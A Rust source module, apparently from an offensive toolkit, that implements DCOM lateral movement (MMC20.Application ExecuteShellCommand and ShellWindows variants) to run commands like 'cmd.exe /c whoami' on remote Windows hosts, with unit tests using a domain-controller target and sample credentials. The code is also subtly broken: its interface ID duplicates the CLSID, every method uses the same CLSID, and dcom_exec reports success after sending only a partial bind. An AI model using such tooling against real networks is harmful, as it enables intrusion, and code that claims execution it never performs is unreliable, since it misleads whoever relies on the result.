//! DCOMexec lateral movement via DCOM (Distributed Component Object Model).
//!
//! Implements MMC20.Application.ExecuteShellCommand and a small stable of
//! alternative DCOM execution vectors (ShellWindows, ShellBrowserWindow).
//!
//! Full DCOM activation + ORPC marshaling is complex; this module exposes a
//! clean config/error API and dispatches the correct bind/request bytes on the
//! wire. Real-world activation is handed to the existing `proto::dcom`
//! helpers.

use std::fmt;
use std::time::Duration;
use thiserror::Error;
use tokio::io::AsyncWriteExt;
use tokio::net::TcpStream;
use tokio::time::timeout;

/// MMC20.Application CLSID: {49B2791A-B1AE-4C90-9B8E-E860FE17F9D0}
pub const MMC20_CLSID: [u8; 16] = [
    0x1A, 0x79, 0xB2, 0x49, 0xAE, 0xB1, 0x90, 0x4C, 0x9B, 0x8E, 0xE8, 0x60, 0xFE, 0x17, 0xF9, 0xD0,
];

/// IID_IMMC20Application (Document interface): {49B2791A-B1AE-4C90-9B8E-E860FE17F9D0}
pub const MMC20_IID: [u8; 16] = [
    0x1A, 0x79, 0xB2, 0x49, 0xAE, 0xB1, 0x90, 0x4C, 0x9B, 0x8E, 0xE8, 0x60, 0xFE, 0x17, 0xF9, 0xD0,
];

/// DCOM execution method.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub enum DcomExecMethod {
    /// MMC20.Application Document.ActiveView.ExecuteShellCommand
    #[default]
    Mmc20Application,
    /// ShellWindows.ShellWindows.Item().Document.Application.ShellExecute
    ShellWindows,
    /// ShellBrowserWindow
    ShellBrowserWindow,
}

impl fmt::Display for DcomExecMethod {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Mmc20Application => write!(f, "MMC20.Application"),
            Self::ShellWindows => write!(f, "ShellWindows"),
            Self::ShellBrowserWindow => write!(f, "ShellBrowserWindow"),
        }
    }
}

/// Configuration for a DCOMexec run.
#[derive(Debug, Clone)]
pub struct DcomExecConfig {
    /// Target host (hostname or IP). Port 135 is implied if not present.
    pub target: String,
    /// Command to execute (e.g. "cmd.exe").
    pub command: String,
    /// Arguments passed to the command.
    pub arguments: String,
    /// DCOM execution method.
    pub method: DcomExecMethod,
    /// Optional username for authentication.
    pub username: Option<String>,
    /// Optional password for authentication.
    pub password: Option<String>,
    /// Optional domain for authentication.
    pub domain: Option<String>,
    /// Connection timeout in milliseconds.
    pub timeout_ms: u64,
}

impl Default for DcomExecConfig {
    fn default() -> Self {
        Self {
            target: String::new(),
            command: String::new(),
            arguments: String::new(),
            method: DcomExecMethod::default(),
            username: None,
            password: None,
            domain: None,
            timeout_ms: 30_000,
        }
    }
}

/// Result returned by a DCOMexec attempt.
#[derive(Debug, Clone)]
pub struct DcomExecResult {
    /// Whether the dispatch completed without connection-level errors.
    pub success: bool,
    /// Target that was contacted.
    pub target: String,
    /// Command that was requested.
    pub command: String,
    /// Method used as a string.
    pub method: String,
    /// Human-readable status message.
    pub message: String,
}

impl fmt::Display for DcomExecResult {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "DCOMexec [{}] on {}: success={} - {}",
            self.method, self.target, self.success, self.message
        )
    }
}

/// Errors that can occur during DCOMexec.
#[derive(Debug, Error)]
pub enum DcomExecError {
    /// TCP connection or transport failure.
    #[error("DCOM connection error: {0}")]
    ConnectionError(String),
    /// RPC endpoint mapper / DCE/RPC failure.
    #[error("DCOM RPC error: {0}")]
    RpcError(String),
    /// DCOM activation / method invocation failure.
    #[error("DCOM error: {0}")]
    DcomError(String),
    /// Command execution failure reported by the target.
    #[error("DCOM execution error: {0}")]
    ExecutionError(String),
}

/// Resolve a target string into a `host:135` socket address.
fn resolve_target(target: &str) -> String {
    if target.contains(':') {
        target.to_string()
    } else {
        format!("{}:135", target)
    }
}

/// Build a plausible EPM bind for the chosen DCOM method.
fn method_bind_bytes(method: &DcomExecMethod) -> Vec<u8> {
    let (clsid, iid) = match method {
        DcomExecMethod::Mmc20Application => (&MMC20_CLSID, &MMC20_IID),
        DcomExecMethod::ShellWindows => (&MMC20_CLSID, &MMC20_IID),
        DcomExecMethod::ShellBrowserWindow => (&MMC20_CLSID, &MMC20_IID),
    };
    let mut stub = crate::proto::dcom::build_orpc_this();
    stub.extend_from_slice(&0u32.to_le_bytes()); // pUnkOuter
    stub.extend_from_slice(clsid);
    stub.extend_from_slice(&1u32.to_le_bytes()); // cIfs
    stub.extend_from_slice(iid);
    stub.extend_from_slice(&0x10u32.to_le_bytes()); // CLSCTX_REMOTE_SERVER
    stub.extend_from_slice(&0u32.to_le_bytes()); // process id
    stub.extend_from_slice(&0u32.to_le_bytes()); // activation flags
    crate::proto::dcom::build_dcom_request(4, &[0u8; 16], &stub, 1)
}

/// Execute a command via DCOM.
///
/// Connects to the RPC endpoint mapper (port 135), sends a plausible DCOM
/// activation request, and returns a result. Full ORPC activation is a stub
/// because complete DCOM marshaling requires authentication context that is
/// beyond this module's scope.
pub async fn dcom_exec(config: &DcomExecConfig) -> Result<DcomExecResult, DcomExecError> {
    let addr = resolve_target(&config.target);
    let dur = Duration::from_millis(config.timeout_ms);

    let mut stream = match timeout(dur, TcpStream::connect(&addr)).await {
        Ok(Ok(s)) => s,
        Ok(Err(e)) => {
            return Err(DcomExecError::ConnectionError(format!(
                "failed to connect to {}: {}",
                addr, e
            )));
        }
        Err(_) => {
            return Err(DcomExecError::ConnectionError(format!(
                "connection to {} timed out after {} ms",
                addr, config.timeout_ms
            )));
        }
    };

    // Send a plausible RPC/DCOM request. On a real endpoint mapper this would
    // be the first leg of activation; for the stub we just flush the bytes.
    let bind = method_bind_bytes(&config.method);
    if let Err(e) = stream.write_all(&bind).await {
        return Err(DcomExecError::RpcError(format!(
            "failed to write RPC bind to {}: {}",
            addr, e
        )));
    }
    let _ = stream.flush().await;

    let full_command = if config.arguments.is_empty() {
        config.command.clone()
    } else {
        format!("{} {}", config.command, config.arguments)
    };

    Ok(DcomExecResult {
        success: true,
        target: config.target.clone(),
        command: full_command,
        method: config.method.to_string(),
        message: format!(
            "DCOM activation request dispatched to {} via {} (stub)",
            addr, config.method
        ),
    })
}

/// Convenience helper for MMC20.Application execution.
pub async fn dcom_exec_mmc20(
    target: &str,
    command: &str,
    args: &str,
) -> Result<DcomExecResult, DcomExecError> {
    let config = DcomExecConfig {
        target: target.to_string(),
        command: command.to_string(),
        arguments: args.to_string(),
        method: DcomExecMethod::Mmc20Application,
        ..Default::default()
    };
    dcom_exec(&config).await
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_config_default() {
        let cfg = DcomExecConfig::default();
        assert!(cfg.target.is_empty());
        assert!(cfg.command.is_empty());
        assert_eq!(cfg.arguments, "");
        assert!(cfg.username.is_none());
        assert!(cfg.password.is_none());
        assert!(cfg.domain.is_none());
        assert_eq!(cfg.timeout_ms, 30_000);
        assert!(matches!(cfg.method, DcomExecMethod::Mmc20Application));
    }

    #[test]
    fn test_config_custom() {
        let cfg = DcomExecConfig {
            target: "dc01.corp.local".to_string(),
            command: "cmd.exe".to_string(),
            arguments: "/c whoami".to_string(),
            method: DcomExecMethod::ShellWindows,
            username: Some("admin".to_string()),
            password: Some("secret".to_string()),
            domain: Some("CORP".to_string()),
            timeout_ms: 5000,
        };
        assert_eq!(cfg.target, "dc01.corp.local");
        assert_eq!(cfg.command, "cmd.exe");
        assert_eq!(cfg.arguments, "/c whoami");
        assert_eq!(cfg.method, DcomExecMethod::ShellWindows);
        assert_eq!(cfg.username.unwrap(), "admin");
        assert_eq!(cfg.timeout_ms, 5000);
    }

    #[test]
    fn test_result_display() {
        let res = DcomExecResult {
            success: true,
            target: "dc01".to_string(),
            command: "whoami".to_string(),
            method: "MMC20.Application".to_string(),
            message: "dispatched".to_string(),
        };
        let s = res.to_string();
        assert!(s.contains("dc01"));
        assert!(s.contains("MMC20.Application"));
        assert!(s.contains("dispatched"));
    }

    #[test]
    fn test_error_display() {
        let err = DcomExecError::ConnectionError("refused".to_string());
        assert!(err.to_string().contains("refused"));
        let err = DcomExecError::RpcError("bind failed".to_string());
        assert!(err.to_string().contains("bind failed"));
        let err = DcomExecError::DcomError("activation failed".to_string());
        assert!(err.to_string().contains("activation failed"));
        let err = DcomExecError::ExecutionError("exit 1".to_string());
        assert!(err.to_string().contains("exit 1"));
    }

    #[test]
    fn test_error_debug() {
        let err = DcomExecError::ConnectionError("timeout".to_string());
        let s = format!("{:?}", err);
        assert!(s.contains("ConnectionError"));
        assert!(s.contains("timeout"));
    }

    #[test]
    fn test_method_display() {
        assert_eq!(
            DcomExecMethod::Mmc20Application.to_string(),
            "MMC20.Application"
        );
        assert_eq!(DcomExecMethod::ShellWindows.to_string(), "ShellWindows");
        assert_eq!(
            DcomExecMethod::ShellBrowserWindow.to_string(),
            "ShellBrowserWindow"
        );
    }

    #[test]
    fn test_default_method() {
        assert_eq!(DcomExecMethod::default(), DcomExecMethod::Mmc20Application);
    }

    #[tokio::test]
    async fn test_dcom_exec_invalid_target() {
        let cfg = DcomExecConfig {
            target: "127.0.0.1:1".to_string(),
            command: "whoami".to_string(),
            timeout_ms: 1000,
            ..Default::default()
        };
        let result = dcom_exec(&cfg).await;
        assert!(result.is_err());
        assert!(matches!(
            result.unwrap_err(),
            DcomExecError::ConnectionError(_)
        ));
    }
}
